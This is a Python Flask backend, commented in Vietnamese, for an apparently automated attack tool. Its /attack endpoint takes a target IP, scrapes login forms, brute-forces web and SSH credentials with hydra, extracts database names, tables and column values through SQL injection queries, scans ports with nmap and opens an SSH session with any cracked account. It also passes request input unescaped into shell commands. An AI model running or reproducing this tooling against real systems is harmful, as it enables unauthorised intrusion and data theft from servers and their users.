from flask import Flask, jsonify, request
import requests
from bs4 import BeautifulSoup
import subprocess
import re
import socket
import xml.etree.ElementTree as ET
from global_var import *
from sqlapi import *
import asyncio

app = Flask(__name__)

# api ssh
@app.route('/account/ssh', methods=['GET'])
def account_ssh():
    data = {
        "account_ssh": getACCOUNT_SSH()
    }
    return jsonify(data)

# api opening port
@app.route('/ports', methods=['GET'])
def ports():
    data = {
        "ports": getPORTS()
    }
    return jsonify(data)

# api database
@app.route('/db', methods=['GET'])
def dbs():
    data = {
        "dbs": getDBS(),
        "server_db": getBackDB()
    }
    return jsonify(data)

# api account_web
@app.route('/account/web', methods=['GET'])
def account_web():
    data = {
        "account_web": getACCOUNT_WEB()
    }
    return jsonify(data)

# api screen
@app.route('/screen', methods=['GET'])
def screen():
    data = {
        "forms": getFORMS(),
        "ports": getPORTS(),
        "account_web": getACCOUNT_WEB(),
        "account_ssh": getACCOUNT_SSH(),
        "dbs": getDBS(),
        "server_db": getBackDB()
    }
    return jsonify(data)

# api loc forms
@app.route('/attack', methods=['POST'])
def attack():
    reset()
    url = request.json['ip']
    ip = ''
    if '/' in url:
            match = re.match(r'(\d+\.\d+\.\d+\.\d+)/', url)
            if match:
                ip = match.group(1)
    else:
            ip = url
    print(ip)
    url = 'http://' + ip
    setIP(ip)
    extract_forms(url)
    forms = getFORMS()
    sql_result = ''
    for form in forms:
        if 'username' in form['inputs']:
            brute_force_web(ip, USERLIST, PASSLIST, form['method'], form['action'])
        if getBackDB() == '':
            try:
                target = url + form['action']
                data = "&".join([f"{input}=1" for input in form['inputs']])
                sql_result = query(target, data, True, False, False, 'web_app1', 'user')
                # Trích xuất tên hệ quản trị cơ sở dữ liệu (DBMS)
                print(sql_result)
            
                dbms = sql_result['data'][1]['value'][0]['dbms']
                databases = sql_result['data'][2]['value']
                setBackDB(dbms)
                setDBS(databases)
            except:
                print('error')

    print(getACCOUNT_WEB())
    scan_ports(ip, 20, 90)
    ports = getPORTS()
    for port in ports:
        if port['port'] == '22' and port['service'] == 'ssh':
            brute_force_ssh(ip, 'ssh', USERLIST, PASSLIST)
    account_ssh = getACCOUNT_SSH()
    
    if account_ssh:
        account_con = account_ssh[0]
        print(account_con)
        connect_ssh(ip, account_con['username'], account_con['password'])

    data = {
        "forms": getFORMS(),
        "ports": getPORTS(),
        "account_web": getACCOUNT_WEB(),
        "account_ssh": getACCOUNT_SSH(),
        "dbs": getDBS(),
        "server_db": getBackDB()
    }
    return jsonify(data)
    
# api lay table
@app.route('/table', methods=['POST'])
def table():
    url = 'http://' + getIP()
    dbName = request.json['db']
    forms = getFORMS()
    sql_result = ''
    for form in forms:
        target = url + form['action']
        data = "&".join([f"{input}=1" for input in form['inputs']])
        sql_result = query(target, data, False, True, False, dbName, 'user')
        print(sql_result)
        # Trích xuất tên các table
        tables = sql_result['data'][2]['value'][dbName]
        setTables(tables)
    data = {
        "db": dbName,
        "tables": getTables()
    }
    return jsonify(data)

# api lay chi tiet
@app.route('/detail', methods=['POST'])
def detail():
    url = 'http://' + getIP()
    dbName = request.json['db']
    tblName = request.json['table']
    forms = getFORMS()
    sql_result = ''
    for form in forms:
        target = url + form['action']
        data = "&".join([f"{input}=1" for input in form['inputs']])
        sql_result = query(target, data, False, False, True, dbName, tblName)
        print(sql_result)
        # Trích xuất tên các table
        value = sql_result['data'][2]['value']
        # Danh sách kết quả
        columns = []

        # Bóc tách từng cột
        for column, details in value.items():
            if isinstance(details, dict) and 'values' in details:
                column_values = {
                    'column': column,
                    'values': details['values']
                }
                columns.append(column_values)
        setColumns(columns)
    data = {
        "db": dbName,
        "tbl": tblName,
        "columns": getColumns()
    }
    return jsonify(data)
    

# quet forms
def extract_forms(url):
    url = 'http://' + request.json['ip']
    
    try:
        response = requests.get(url)
        forms = []
        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')
            for form_tag in soup.find_all('form'):
                form = {}
                form['action'] = form_tag.get('action')
                form['method'] = form_tag.get('method', 'GET')  # Mặc định là GET nếu không được chỉ định
                form['inputs'] = [input_tag.get('name') for input_tag in form_tag.find_all('input') if input_tag.get('name')]
                forms.append(form)
        setFORMS(forms)
    except:
        print("wrong ip...")

# brute force web
def brute_force_web(target, userlist, passlist, method, path):
    _method = 'http-get-form'
    if method == 'post':
        _method = 'http-post-form'
    # Xây dựng command cho hydra
    command = f"hydra -L {userlist} -P {passlist} {target} {_method} '{path}:username=^USER^&password=^PASS^:F=/login' -v -o {ACCOUNT_WEB_LIST}"
    print(command)
    try:
    # Gọi lệnh hydra từ Python
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        output, error = process.communicate()
        print(output)
        account_web = []
        with open(ACCOUNT_WEB_LIST, "r") as file:
            for line in file:
                # Sử dụng biểu thức chính quy để trích xuất thông tin tài khoản từ mỗi dòng
                match = re.match(r".*login:\s+(\S+)\s+password:\s+(\S+)", line)
                if match:
                    # Lấy username và password từ kết quả match
                    username = match.group(1)
                    password = match.group(2)
                    print(username, password)
                    account = {}
                    account['username'] = username
                    account['password'] = password
                    account_web.append(account)
        setACCOUNT_WEB(account_web)
    except Exception as e:
        print("Error:", e)
    

# quet port
def scan_ports(ip, start_port, end_port):
    open_ports = []
    command = f"nmap {ip} -oX {PORTS_LIST}"
    print(command)
    try:
        # Gọi lệnh hydra từ Python
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        output, error = process.communicate()
        print(output)
        tree = ET.parse(PORTS_LIST)
        root = tree.getroot()
        for port in root.findall('.//port'):
            portid = port.get('portid')
            state = port.find('state').get('state')
            service = port.find('service').get('name')
            portVar = {}
            portVar['port'] = portid
            portVar['state'] = state
            portVar['service'] = service
            open_ports.append(portVar)
        setPORTS(open_ports)
    except Exception as e:
        print("Error:", e)


# brute force ssh
def brute_force_ssh(target, protocol, userlist, passlist):
    # Xây dựng command cho hydra
    command = f"hydra -L {userlist} -P {passlist} {protocol}://{target} -o {ACCOUNT_SSH_LIST}"
    
    try:
        # Gọi lệnh hydra từ Python
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        output, error = process.communicate()

        account_ssh = []
        with open(ACCOUNT_SSH_LIST, "r") as file:
            for line in file:
                # Sử dụng biểu thức chính quy để trích xuất thông tin tài khoản từ mỗi dòng
                match = re.match(r".*login:\s+(\S+)\s+password:\s+(\S+)", line)
                if match:
                    # Lấy username và password từ kết quả match
                    username = match.group(1)
                    password = match.group(2)
                    print(username, password)
                    account = {}
                    account['username'] = username
                    account['password'] = password
                    account_ssh.append(account)
        setACCOUNT_SSH(account_ssh)
    except Exception as e:
        print("Error:", e)

# open terminal ssh
def connect_ssh(ip_address, username, password):
    print(ip_address, username, password)
    # Tạo command string chứa lệnh mở terminal mới và kết nối SSH
    command = f"./ssh.sh {username} {ip_address} {password}"
    # Thực thi command bằng subprocess
    subprocess.call(command, shell=True)


if __name__ == '__main__':
    # subprocess.run(['sqlmapapi', '-s', '-H', '127.0.0.1', '-p', '7000'], check=True)
    app.run(debug=True)
